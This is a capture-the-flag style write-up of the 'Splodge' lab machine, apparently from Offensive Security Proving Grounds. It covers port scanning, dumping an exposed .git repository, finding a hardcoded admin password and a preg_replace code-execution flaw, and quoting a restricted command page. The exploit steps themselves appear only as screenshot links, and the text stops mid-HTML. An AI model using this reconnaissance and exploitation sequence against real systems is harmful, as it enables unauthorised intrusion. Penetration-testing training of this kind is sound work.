# Splodge

# Enumeration

## nmap

```bash
# Nmap 7.91 scan initiated Sun Feb 27 08:34:35 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Splodge/results/192.168.71.108/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Splodge/results/192.168.71.108/scans/xml/_full_tcp_nmap.xml" 192.168.71.108
adjust_timeouts2: packet supposedly had rtt of -133294 microseconds.  Ignoring time.
Nmap scan report for 192.168.71.108
Host is up, received user-set (0.18s latency).
Scanned at 2022-02-27 08:34:35 EST for 298s
Not shown: 65530 filtered ports
Reason: 65530 no-responses
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 43:77:53:46:f8:78:c6:cb:c4:c6:b5:f2:61:2a:64:13 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPwvufh9SVq1esIL7otDp06DD4IT3lXLNsiufWRGWZwSq8BB+29e4wiJnBQfAiQFF/dNt5p27eJzYa+OYewPk7Zit35SAICkvHV3NA/zI4pax4JRd5AHM+zroHUcV6SqwX+rd531CPzaAb8Xaak//bMLeNKq2c1JZQeoaYmfbn+Td7ta84bxvT8espah5VcbAem7pave8aO9tPiUbwyv7XcuRQjvka6rpP5PEtsfjV9lZpUySf+aBqCo+pLsiSwKo5TvfZgPWKdy1t+22AxBN9RRdOjL+sUuebhpeFVIJvSdbUZHzadBHKGP3UrBJiJTt4f6ZAPZ0K8u2DVYayc82j
|   256 a5:b4:45:1f:eb:10:ac:1d:fc:64:de:4b:87:ed:7d:ca (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLLwdPpjO1Ei905tBE6MjbWXmZ184WFpsIrIoICi912YeOtl1bIhE4MKxi9XmFXsiHUfzF+XGVju5DJn6PedwXc=
|   256 44:7c:68:45:db:3d:45:9b:ec:7c:0d:94:6b:9e:31:f5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEu69xrp39qFb1fQ53wr0mHcTOIZlr2Lvez7PabGgwdS
80/tcp   open  http       syn-ack ttl 63 nginx 1.16.1
| http-git: 
|   192.168.71.108:80/.git/
|     Git repository found!
|     .gitignore matched patterns 'bug' 'key'
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: initial commit 
|_    Project type: node.js application (guessed from .gitignore)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.16.1
|_http-title: 403 Forbidden
1337/tcp open  http       syn-ack ttl 63 nginx 1.16.1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.16.1
|_http-title: Commando
5432/tcp open  postgresql syn-ack ttl 63 PostgreSQL DB 9.6.0 or later
| fingerprint-strings: 
|   Kerberos: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 27265.28208: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2071
|     RProcessStartupPacket
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2071
|     RProcessStartupPacket
|   ZendJavaBridge: 
|_    EFATAL: unsupported frontend protocol 0.0: server supports 2.0 to 3.0
8080/tcp open  http       syn-ack ttl 63 nginx 1.16.1
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.16.1
|_http-title: Splodge | Home
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5432-TCP:V=7.91%I=9%D=2/27%Time=621B7EB2%P=x86_64-pc-linux-gnu%r(SM
SF:BProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fronten
SF:d\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x203
SF:\.0\0Fpostmaster\.c\0L2071\0RProcessStartupPacket\0\0")%r(Kerberos,8C,"
SF:E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20frontend\x20protocol
SF:\x2027265\.28208:\x20server\x20supports\x202\.0\x20to\x203\.0\0Fpostmas
SF:ter\.c\0L2071\0RProcessStartupPacket\0\0")%r(ZendJavaBridge,48,"EFATAL:
SF:\x20\x20unsupported\x20frontend\x20protocol\x200\.0:\x20server\x20suppo
SF:rts\x202\.0\x20to\x203\.0\n\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4.4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.12 (90%), Linux 4.4 (90%), Linux 4.9 (89%), Linux 3.10 - 3.16 (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=2/27%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=621B7F15%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=10B%TI=Z%TS=A)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.005 days (since Sun Feb 27 08:31:44 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   179.84 ms 192.168.49.1
2   179.82 ms 192.168.71.108

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 27 08:39:33 2022 -- 1 IP address (1 host up) scanned in 298.77 seconds
```

## 80 - Web
### git

```bash
┌──(kali㉿kali)-[~]
└─$ cd /tmp         
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/arthaud/git-dumper.git     
Cloning into 'git-dumper'...
remote: Enumerating objects: 136, done.
remote: Counting objects: 100% (72/72), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 136 (delta 49), reused 44 (delta 40), pack-reused 64
Receiving objects: 100% (136/136), 48.81 KiB | 4.88 MiB/s, done.
Resolving deltas: 100% (70/70), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd git-dumper 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-dumper]
└─$ ./git_dumper.py http://192.168.71.108/.git /tmp/repo    
[-] Testing http://192.168.71.108/.git/HEAD [200]
[-] Testing http://192.168.71.108/.git/ [403]
[-] Fetching common files
[-] Fetching http://192.168.71.108/.gitignore [200]
[-] Fetching http://192.168.71.108/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://192.168.71.108/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://192.168.71.108/.git/hooks/post-update.sample [200]
[-] Fetching http://192.168.71.108/.git/hooks/pre-commit.sample [200]
[-] Fetching http://192.168.71.108/.git/hooks/post-receive.sample [404]
[-] http://192.168.71.108/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://192.168.71.108/.git/description [200]
[-] Fetching http://192.168.71.108/.git/COMMIT_EDITMSG [200]
[-] Fetching http://192.168.71.108/.git/hooks/pre-push.sample [200]
[-] Fetching http://192.168.71.108/.git/hooks/pre-receive.sample [404]
[-] http://192.168.71.108/.git/hooks/pre-receive.sample responded with status code 404
[-] Fetching http://192.168.71.108/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://192.168.71.108/.git/objects/info/packs [404]
[-] http://192.168.71.108/.git/objects/info/packs responded with status code 404
[-] Fetching http://192.168.71.108/.git/index [200]
[-] Fetching http://192.168.71.108/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://192.168.71.108/.git/info/exclude [200]
[-] Fetching http://192.168.71.108/.git/hooks/update.sample [200]
[-] Fetching http://192.168.71.108/.git/hooks/post-commit.sample [404]
[-] Fetching http://192.168.71.108/.git/hooks/commit-msg.sample [200]
[-] http://192.168.71.108/.git/hooks/post-commit.sample responded with status code 404
[-] Finding refs/
[-] Fetching http://192.168.71.108/.git/ORIG_HEAD [404]
[-] http://192.168.71.108/.git/ORIG_HEAD responded with status code 404
[-] Fetching http://192.168.71.108/.git/config [200]
[-] Fetching http://192.168.71.108/.git/info/refs [404]
[-] http://192.168.71.108/.git/info/refs responded with status code 404
[-] Fetching http://192.168.71.108/.git/FETCH_HEAD [404]
[-] http://192.168.71.108/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://192.168.71.108/.git/HEAD [200]
[-] Fetching http://192.168.71.108/.git/logs/HEAD [200]
[-] Fetching http://192.168.71.108/.git/logs/refs/stash [404]
[-] http://192.168.71.108/.git/logs/refs/stash responded with status code 404
[-] Fetching http://192.168.71.108/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://192.168.71.108/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://192.168.71.108/.git/logs/refs/heads/master [200]
[-] Fetching http://192.168.71.108/.git/logs/refs/remotes/origin/master [404]
[-] http://192.168.71.108/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://192.168.71.108/.git/packed-refs [404]
[-] http://192.168.71.108/.git/packed-refs responded with status code 404
[-] Fetching http://192.168.71.108/.git/refs/heads/master [200]
[-] Fetching http://192.168.71.108/.git/refs/remotes/origin/master [404]
[-] http://192.168.71.108/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://192.168.71.108/.git/refs/remotes/origin/HEAD [404]
[-] http://192.168.71.108/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://192.168.71.108/.git/refs/stash [404]
[-] http://192.168.71.108/.git/refs/stash responded with status code 404
[-] Fetching http://192.168.71.108/.git/refs/wip/index/refs/heads/master [404]
[-] Fetching http://192.168.71.108/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://192.168.71.108/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] http://192.168.71.108/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://192.168.71.108/.git/objects/13/5e97788973338cc8376d5feb5d1d07c8f6e793 [200]
[-] Fetching http://192.168.71.108/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://192.168.71.108/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://192.168.71.108/.git/objects/bf/d96a6a2b88fb6187704659666246ba1156f48f [200]
[-] Fetching http://192.168.71.108/.git/objects/d9/82df191bfb0e3388bd71526199f985d00a6691 [200]
[-] Fetching http://192.168.71.108/.git/objects/ac/a5ad3b2db4dae122d10ba1c57ad018ffa927e1 [200]
[-] Fetching http://192.168.71.108/.git/objects/e8/312ba2eb01304cf50e140624e283f6b23cf714 [200]
[-] Fetching http://192.168.71.108/.git/objects/e4/cec9c8b11b242137e1a4ed5ddc8bfb35d898c4 [200]
[-] Fetching http://192.168.71.108/.git/objects/c1/620c1bde0eb849d056702b4fcbe3d598ae8036 [200]
[-] Fetching http://192.168.71.108/.git/objects/4d/83ebd0cb1145c5097dbc0a694094b41b3c3f0b [200]
[-] Fetching http://192.168.71.108/.git/objects/d4/8141187786931ec2cf8645e384be7878c7dc53 [200]
[-] Fetching http://192.168.71.108/.git/objects/e5/506df2907a7c8f63f3841a918611b93d67e84e [200]
[-] Fetching http://192.168.71.108/.git/objects/f8/f52abe5fff28d4638b105f2d2ca5df8614b2c8 [200]
[-] Fetching http://192.168.71.108/.git/objects/44/dc07b0e1a1119264e6d302d16d3978ed9f5f61 [200]
[-] Fetching http://192.168.71.108/.git/objects/86/b16af6f321056e9d9ae994965e4da4dc83bab5 [200]
[-] Fetching http://192.168.71.108/.git/objects/f7/7265abd9b0d4a0681a849373f60ccdfed0d1d0 [200]
[-] Fetching http://192.168.71.108/.git/objects/b2/ea669a0d282114a7875ffe769da416a0c7f18e [200]
[-] Fetching http://192.168.71.108/.git/objects/66/d34c3d75dc9908760d7afd0900b511497260c4 [200]
[-] Fetching http://192.168.71.108/.git/objects/ed/c036dd01b01115145554cd5287189abc791d2d [200]
[-] Fetching http://192.168.71.108/.git/objects/cf/726eecdfe76d0b0e4bd02e42df02c7c31f8bd1 [200]
[-] Fetching http://192.168.71.108/.git/objects/97/84b1a3003a2864ecba016ab4f0382e7eb514f5 [200]
[-] Fetching http://192.168.71.108/.git/objects/b6/a4b86d7896efb1b63e08eaf6dcb22a19d2f06f [200]
[-] Fetching http://192.168.71.108/.git/objects/94/3e9a4da4e6bf269681b95a3422e7a5bc4e63a0 [200]
[-] Fetching http://192.168.71.108/.git/objects/e5/544d2016657f3b661a279f89194440ea7ba256 [200]
[-] Fetching http://192.168.71.108/.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 [200]
[-] Fetching http://192.168.71.108/.git/objects/60/1e61cf8b529631cdffa6886d91951f4efe9046 [200]
[-] Fetching http://192.168.71.108/.git/objects/44/60f0ec256990d01bddfdd7a048f6e8b0a87f39 [200]
[-] Fetching http://192.168.71.108/.git/objects/98/e6ef67fad8af56cb3721edbd420b3d6fcc0bb1 [200]
[-] Fetching http://192.168.71.108/.git/objects/6a/8d6b7e6c9ad3cd0683f3ecb76b9130ad50857b [200]
[-] Fetching http://192.168.71.108/.git/objects/4a/937f5081c45dcf8c5b621e3973d69c3baca321 [200]
[-] Fetching http://192.168.71.108/.git/objects/a7/9a16e88d5c43ba5857059a5978144cf24312c3 [200]
[-] Fetching http://192.168.71.108/.git/objects/35/2cce44a3debcbb07fe36af93ec156cd6ed9a94 [200]
[-] Fetching http://192.168.71.108/.git/objects/3a/a15f8dd91d421fa5bc761866f762b8e90c6c74 [200]
[-] Fetching http://192.168.71.108/.git/objects/eb/080e96835e9a2202f19e1bf5a1675c7c407356 [200]
[-] Fetching http://192.168.71.108/.git/objects/4c/668d49c354f05fa34c68240fbfd592e16e1c1a [200]
[-] Fetching http://192.168.71.108/.git/objects/80/4799bafe1da2889c0cc8ae43ff3c307f017e3c [200]
[-] Fetching http://192.168.71.108/.git/objects/09/713970767399318c41288462d67069cbf9d6f6 [200]
[-] Fetching http://192.168.71.108/.git/objects/f2/801adf6f14436fc9d3e1d6748d25ed601da062 [200]
[-] Fetching http://192.168.71.108/.git/objects/bb/92224c59db71708ff7a6547479f74f1b00ce73 [200]
[-] Fetching http://192.168.71.108/.git/objects/62/2e774b33c2a0c0474a6221ce6090c40f4647ab [200]
[-] Fetching http://192.168.71.108/.git/objects/6b/eecd1b2442945ae736943bcec16b61aa0b9b26 [200]
[-] Fetching http://192.168.71.108/.git/objects/2a/cfd9cc9c44c1b4cd87d5966a399b535062eaec [200]
[-] Fetching http://192.168.71.108/.git/objects/8f/23fce700f5f58a8a56e8cad6436f936d5c8e26 [200]
[-] Fetching http://192.168.71.108/.git/objects/a7/47e31b81798904ec6becb6ba5bfe66dffab2f4 [200]
[-] Fetching http://192.168.71.108/.git/objects/f1/6a20b9bfc5092708c7f00900a6655c4c1079d3 [200]
[-] Fetching http://192.168.71.108/.git/objects/96/7315dd3d16d50942fa7abd383dfb95ec685491 [200]
[-] Fetching http://192.168.71.108/.git/objects/d3/242e0e35197da6c89b343db73b34726e6fa7ca [200]
[-] Fetching http://192.168.71.108/.git/objects/eb/0536286f3081c6c0646817037faf5446e3547d [200]
[-] Fetching http://192.168.71.108/.git/objects/1e/1d775fefb3d7e88621fed07137f0cc3b891082 [200]
[-] Fetching http://192.168.71.108/.git/objects/79/26c7946117eb427cd8f208fc7991580e89074a [200]
[-] Fetching http://192.168.71.108/.git/objects/b0/2b700f1bfc86318cff8f4c4a7f0820974d464a [200]
[-] Fetching http://192.168.71.108/.git/objects/35/471f6ff156325ed0fdb98b03e611c2cd43f675 [200]
[-] Fetching http://192.168.71.108/.git/objects/5e/ecd2b26602bae75f603871a963c5c91dbd80a8 [200]
[-] Fetching http://192.168.71.108/.git/objects/03/e02a23e29174f0ade820fdb4cdfcec3abf8769 [200]
[-] Fetching http://192.168.71.108/.git/objects/c6/41ca5e5b96c5fb325a43709dea06dd5b3cfade [200]
[-] Fetching http://192.168.71.108/.git/objects/ca/b5d068f75650dcba53e7c38dd19aa1348ef596 [200]
[-] Fetching http://192.168.71.108/.git/objects/f0/d3627b59e9b9b158ce91ea4f641d5f604576cb [200]
[-] Fetching http://192.168.71.108/.git/objects/53/202ac152392692f28ebda0206728ca249545d0 [200]
[-] Fetching http://192.168.71.108/.git/objects/0d/9ecbd5c9afb9d2e61c5be6ffbd7c2e5c6cfb26 [200]
[-] Fetching http://192.168.71.108/.git/objects/22/4039688adbd5bbe6e6bbc30527b41b7e5b390c [200]
[-] Fetching http://192.168.71.108/.git/objects/c9/59212b1c6b23b2163fa2e59a14915047034c3d [200]
[-] Fetching http://192.168.71.108/.git/objects/e8/7f0320f0613dd06d74ecb6fe8eae37e99a7909 [200]
[-] Fetching http://192.168.71.108/.git/objects/5f/b6379e71f275a1784e6638adc96420aaa5c5b2 [200]
[-] Fetching http://192.168.71.108/.git/objects/75/dd0cdedbe262bacc85395e4155d35f20d7db99 [200]
[-] Fetching http://192.168.71.108/.git/objects/45/44f60c4161ad433351dc4916eb76fea36b109b [200]
[-] Fetching http://192.168.71.108/.git/objects/5e/a48d39d4f95bf767d324893c80b17432bc9d34 [200]
[-] Fetching http://192.168.71.108/.git/objects/8e/0f04e59789d79d868ed27cfe2c5d3f45969318 [200]
[-] Fetching http://192.168.71.108/.git/objects/d6/b7ef32c8478a48c3994dcadc86837f4371184d [200]
[-] Fetching http://192.168.71.108/.git/objects/6c/119454548d7d9933b6f40a2c26ecf436e0bedd [200]
[-] Fetching http://192.168.71.108/.git/objects/6a/247fefd088bae6baae483aa27872517393f5fe [200]
[-] Fetching http://192.168.71.108/.git/objects/c6/4e19faa559fdacd94a3a69389d2f1c777d2200 [200]
[-] Fetching http://192.168.71.108/.git/objects/78/17501025227225c1ec64325bf6f5e1032f92ee [200]
[-] Fetching http://192.168.71.108/.git/objects/9e/cda835a18095c28597403aa35de8e58464477f [200]
[-] Fetching http://192.168.71.108/.git/objects/a2/c3541410796ce4a59971917e06de17840bd9c6 [200]
[-] Fetching http://192.168.71.108/.git/objects/8f/4803c05638697d84ea28d40693324ec70f7990 [200]
[-] Fetching http://192.168.71.108/.git/objects/e2/779ad8d00db247c45aa773888494bad79c46bc [200]
[-] Fetching http://192.168.71.108/.git/objects/fc/a6152c3ac4baf086492d5e16e5e853c49a7293 [200]
[-] Fetching http://192.168.71.108/.git/objects/f6/c9ba72ab6bc3094cb074f96aaca37ec6fae7a4 [200]
[-] Fetching http://192.168.71.108/.git/objects/7f/c49fede0675d746e3f3135f2466c26417722cb [200]
[-] Fetching http://192.168.71.108/.git/objects/f7/478aeddc606a572b7fb6708ed25d1ec4bea00b [200]
[-] Fetching http://192.168.71.108/.git/objects/b8/94a9a9e06cac34d2c52e876cc862360abdb88b [200]
[-] Fetching http://192.168.71.108/.git/objects/82/598e771767e34baf6b9204c4faadead975b941 [200]
[-] Fetching http://192.168.71.108/.git/objects/6e/50f995f43015bb24c244f88f20c1a394823ea6 [200]
[-] Fetching http://192.168.71.108/.git/objects/c2/573c356f448604a9e4d1e9413ceba8531d7975 [200]
[-] Fetching http://192.168.71.108/.git/objects/a0/e332804039da761bc87984c232fdd922663de3 [200]
[-] Fetching http://192.168.71.108/.git/objects/18/6df0bbdf571e3dbcc3ce461b20922be0cd99b2 [200]
[-] Fetching http://192.168.71.108/.git/objects/63/633fcd9372536d8d06bb13c46a2a355298bc47 [200]
[-] Fetching http://192.168.71.108/.git/objects/96/233b34ccba706a9f89dca87a9282a3cd836e0a [200]
[-] Fetching http://192.168.71.108/.git/objects/1b/428945b3d8251dd5b095c5112c907a8d83bde7 [200]
[-] Fetching http://192.168.71.108/.git/objects/0b/f8edf95f9ac604aaacd85655cf3d683712c9af [200]
[-] Fetching http://192.168.71.108/.git/objects/4a/0bab27ddbff60ad319f0e8120f68bd4d7d8639 [200]
[-] Fetching http://192.168.71.108/.git/objects/ed/2c3aff54a3ba4177385d03b043881ddd188404 [200]
[-] Fetching http://192.168.71.108/.git/objects/35/ce2715314e5785d104ed837ad1ab94ce017597 [200]
[-] Fetching http://192.168.71.108/.git/objects/aa/4a189718891d8390c376e041ee35031a2b64bd [200]
[-] Fetching http://192.168.71.108/.git/objects/e3/b3c9c213248ae8b997da0ed70adab947063e07 [200]
[-] Fetching http://192.168.71.108/.git/objects/81/a6b1db3b5ee741d5d8583683808909465ebd6f [200]
[-] Fetching http://192.168.71.108/.git/objects/a8/017c167a1120b14e3f3d4d23dbd8a9ca7bd134 [200]
[-] Fetching http://192.168.71.108/.git/objects/3c/f5e09286183fa233fe39d26dad9f902fc1c69e [200]
[-] Fetching http://192.168.71.108/.git/objects/fe/daf23d2578d19e50f34276d5badd17c854832e [200]
[-] Fetching http://192.168.71.108/.git/objects/41/95b21b8911fb4b22925c34fe3c7049eb8eb993 [200]
[-] Fetching http://192.168.71.108/.git/objects/9a/27d3a22a99ac59c7b3eed2a440aceb4b7ec862 [200]
[-] Fetching http://192.168.71.108/.git/objects/ad/1794dd723948f62a244d5349fa9a951ed2d118 [200]
[-] Fetching http://192.168.71.108/.git/objects/64/229ff4f99f49ec2930c6f78bef894824b70278 [200]
[-] Fetching http://192.168.71.108/.git/objects/db/47d40acbd5b30dc589fc3333cec8445e3dab46 [200]
[-] Fetching http://192.168.71.108/.git/objects/b8/1458da5f28b99d9b7f76bb5bdc11a1b7b55dce [200]
[-] Fetching http://192.168.71.108/.git/objects/56/1d11b42ffa7e5563300f392295dc9d855cfe67 [200]
[-] Fetching http://192.168.71.108/.git/objects/51/032b0799770dc5f5aabaedf5ab5306865dc401 [200]
[-] Fetching http://192.168.71.108/.git/objects/03/9042d6062e83d08e3b92da25c49a8e238bb0c9 [200]
[-] Fetching http://192.168.71.108/.git/objects/a7/3fecbe570b3e939fe0b454e89e95b5d073097b [200]
[-] Running git checkout .
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-dumper]
└─$ cd /tmp/repo    
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/repo]
└─$ ls
app  artisan  bootstrap  composer.json  composer.lock  config  database  phpunit.xml  public  resources  routes  server.php  storage

┌──(kali㉿kali)-[/tmp/repo]
└─$ git status                                         
On branch master
nothing to commit, working tree clean
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/repo]
└─$ git log   
commit 6c119454548d7d9933b6f40a2c26ecf436e0bedd (HEAD -> master)
Author: The Splodge <admin@splodge.offsec>
Date:   Sat Oct 17 22:54:11 2020 -0400

    initial commit

┌──(kali㉿kali)-[/tmp/repo]
└─$
```



## 1337 - Web

![](Pasted%20image%2020220227214013.png)

![](Pasted%20image%2020220227214046.png)

![](Pasted%20image%2020220227214101.png)
![](Pasted%20image%2020220227215133.png)
![](Pasted%20image%2020220227215147.png)
![](Pasted%20image%2020220227215213.png)
## 8080 - Web

![](Pasted%20image%2020220227213533.png)

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.71.108:8080/robots.txt
User-agent: *
Disallow:
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

# Exploitation

## Code analysis from git repo

After looking at these files

```
/routes/web.php
/repo/app/Http/Controllers/AdminController.php
```

`PostController.php`, look at the preg_replace function
```php
<?php

namespace App\Http\Controllers;

use App\Models\Post;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class PostController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $posts = DB::table('posts')->get();
        return view('index', ['posts' => $posts]);
    }
    
    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Post  $post
     * @return \Illuminate\Http\Response
     */
    public function show(Post $post)
    {
        $comments = DB::table('comments')->where('post_id', '=', $post->id)->get();
        return view('post', ['post' => $post, 'comments' => $comments]);
    }

    /**
     * Comment on a post
     *
     * @param  \App\Models\Post  $post
     * @return \Illuminate\Http\Response
     */
    public function comment(Request $request, Post $post)
    {
        error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED);
        $author = $request->input('commentAuthor');
        $message = $request->input('commentMessage');
        $settings = DB::table('settings')->first();
        $message = preg_replace($settings->filter, $settings->replacement, $message);
        DB::table('comments')->insert(['post_id' => $post->id, 'author' => $author, 'message' => $message]);
        $comments = DB::table('comments')->where('post_id', '=', $post->id)->get();
        return view('post', ['post' => $post, 'comments' => $comments]);
    }
}
```

From `/database/seeds/DatabaseSeeder.php`

```php
<?php

use Illuminate\Database\Seeder;

class DatabaseSeeder extends Seeder
{
    /**
     * Run the database seeds.
     *
     * @return void
     */
    public function run()
    {
        DB::table('posts')->insert([
            'title' => 'Hello World!',
            'content' => 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.',
            'author' => 'The Splodge'
        ]);

        DB::table('posts')->insert([
            'title' => 'Test Post Please Ignore',
            'content' => 'Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?',
            'author' => 'The Splodge'
        ]);

        DB::table('settings')->insert([
            'title' => 'Splodge',
            'filter' => '//',
            'replacement' => '',
            'password' => 'SplodgeSplodgeSplodge'
        ]);
    }
}

```

Credentials is `admin:SplodgeSplodgeSplodge`

![](Pasted%20image%2020220227230214.png)


## Command Injection Tests

eh failed

## preg replace exploit


https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4

![](Pasted%20image%2020220302003323.png)

![](Pasted%20image%2020220302003343.png)


![](Pasted%20image%2020220302003406.png)

![](Pasted%20image%2020220302003419.png)

## Command Injection

![](Pasted%20image%2020220302003455.png)

![](Pasted%20image%2020220302003601.png)

same comment as above

![](Pasted%20image%2020220302003630.png)


### Commando Analysis
![](Pasted%20image%2020220302004034.png)

![](Pasted%20image%2020220302004102.png)

```html
<?php
$cmds = array('id', 'pwd', 'ls', 'ping -c 4 127.0.0.1');
$cmd = strtolower($_GET['cmd']);
$cmdoutput = '';
if (in_array($cmd, $cmds, true)) {
  exec($cmd, $cmdoutput);
} else if ($cmd !== '') {
  $cmdoutput = array('Woah... steady on there buddy. That\'s not allowed.');
  $cmd = '';
} else {
    $cmdoutput =array('');
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <title>Commando</title>
  </head>
  <body>

  <nav class="navbar navbar-light bg-light">
    <span class="navbar-brand mb-0 h1">Commando</span>
  </nav>

  <div class="container">
    <div class="row">
      <div class="col-md-10 mx-auto">
        <h1>Welcome to Commando</h1>
        <p>Run some of your favourite linux commands right here in the browser!</p>
        <p>Here are some good candidates to try.</p>
        <ul>
          <li><code>id</code></li>
          <li><code>pwd</code></li>
          <li><code>ls</code></li>
          <li><code>ping -c 4 127.0.0.1</code></li>
        </ul>
        <small>I promise you this is s3cur3 &lt;3</small> <?php /* Told ya ;) */ ?>
      </div>
    </div>
    <br />
    <div class="row">
      <div class="col-md-10 mx-auto">
        <form method="get">
          <div class="form-group">
            <label>Command</label>
            <input type="text" class="form-control" placeholder="Enter command" name="cmd" value="<?php echo $cmd; ?>"/>
          </div>
          <button type="submit" class="btn btn-primary">Run</button>
        </form>
      </div>
    </div>
    <br />
    <div class="row">
      <div class="col-md-10 mx-auto">
        <h2>Output</h2>
